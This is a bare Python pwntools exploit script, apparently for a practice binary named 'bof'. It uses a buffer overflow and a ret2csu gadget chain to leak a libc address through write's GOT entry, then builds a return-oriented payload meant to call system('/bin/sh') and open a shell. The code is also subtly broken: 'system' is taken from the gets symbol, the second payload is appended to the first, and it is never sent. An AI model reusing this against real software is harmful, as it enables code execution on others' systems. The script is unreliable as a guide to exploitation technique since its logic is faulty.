from pwn import *
r=process("./bof")
b=ELF("./bof")
lib=b.libc
context.log_level='debug'
prdi=0x4005d3		#pop rdi ; ret
pop=0x4005cc		#pop r12~r15
call=0x4005a6		#call [r12](r13,r14,r15)

#===leak===
pay=b'x'*64
pay+=p64(1)		#rbp
pay+=p64(pop)   #ret address
pay+=p64(b.got['write'])#r12
pay+=p64(1)		#r13
pay+=p64(b.got['gets'])	#r14
pay+=p64(8)		#r15
pay+=p64(call)
pay+=p64(0)*7		#pop rbx~r15
pay+=p64(b.sym['main'])	#ret address
pause()
r.sendlineafter("input msg >",pay)

# ===calc===
libc_base=u64(r.recvline().strip())-lib.sym['gets']
system=libc_base+lib.sym['gets']
binsh=libc_base+list(lib.search('/bin/sh'))[0]
log.info(hex(system))
log.info(hex(binsh))
# ===system("/bin/sh")===
pay+=b'x'*72
pay+=p64(prdi)
pay+=p64(binsh)
pay+=p64(prdi+1)
pay+=p64(system)
r.interactive()
